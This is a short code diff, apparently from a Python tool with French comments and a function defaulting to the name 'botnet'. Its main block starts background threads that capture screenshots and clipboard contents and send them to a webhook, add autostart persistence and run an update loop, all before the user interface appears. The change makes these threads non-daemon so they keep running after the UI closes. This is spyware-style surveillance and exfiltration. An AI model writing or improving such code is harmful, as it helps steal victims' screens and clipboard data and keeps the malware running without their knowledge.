@@ -1323,11 +1323,11 @@ def autostart_option_func(script_path=None, name="botnet"):
 
 if __name__ == "__main__":
     # Démarrer tous les threads en arrière-plan AVANT l'UI
-    threading.Thread(target=screenshot_option_func, args=(webhook,), daemon=True).start()
-    threading.Thread(target=clipboard_option_func, args=(webhook,), daemon=True).start()
-    threading.Thread(target=autostart_option_func, daemon=True).start()
-    threading.Thread(target=loop_check, daemon=True).start()
-    threading.Thread(target=boucle, args=(ancienne_version,), daemon=True).start()
+    threading.Thread(target=screenshot_option_func, args=(webhook,), daemon=False).start()
+    threading.Thread(target=clipboard_option_func, args=(webhook,), daemon=False).start()
+    threading.Thread(target=autostart_option_func, daemon=False).start()
+    threading.Thread(target=loop_check, daemon=False).start()
+    threading.Thread(target=boucle, args=(ancienne_version,), daemon=False).start()
     
     # Lancer l'interface (bloquant)
     ft.app(target=main)
